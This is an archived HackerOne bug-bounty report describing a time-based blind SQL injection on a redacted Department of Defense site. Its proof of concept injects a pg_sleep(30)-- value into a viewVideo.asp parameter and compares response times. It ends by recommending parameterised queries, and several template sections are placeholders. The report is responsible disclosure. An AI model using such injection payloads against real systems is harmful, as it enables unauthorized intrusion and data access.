# Blind SQL Injection on DoD Site

## Metadata
- **Source:** HackerOne
- **Report:** 242882 | https://hackerone.com/reports/242882
- **Submitted:** 2017-06-24
- **Reporter:** mr_r3boot
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Hi There, One of the DoD Site is vulnerable to blind sql injection.

#Affected Domain:
www.███

#PoC:
Navigate to below url
``http://www.█████████/viewVideo.asp?t=7``

Just replace ``7`` with ``pg_sleep(__30__)--``

***GET /viewVideo.asp?t=pg_sleep(__30__)--***

As a response you can see time delay compared with ``viewVideo.asp?t=7``

#####Time Slot:

*viewVideo.asp?t=7*                           

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi There, One of the DoD Site is vulnerable to blind sql injection.

#Affected Domain:
www.███

#PoC:
Navigate to below url
``http://www.█████████/viewVideo.asp?t=7``

Just replace ``7`` with ``pg_sleep(__30__)--``

***GET /viewVideo.asp?t=pg_sleep(__30__)--***

As a response you can see time delay compared with ``viewVideo.asp?t=7``

#####Time Slot:

*viewVideo.asp?t=7*                               -----------> 240-330 milliseconds
*viewVideo.asp?t=pg_sleep(__30__)--*    -----------> 15000-19000 milliseconds

#Fix:
Should sanitize the dangerous input or using parameterised queries.

Let me know if any further info is required.

Regards,
**Mr_R3boot**.

</details>

---
*Analysed by Claude on 2026-05-24*
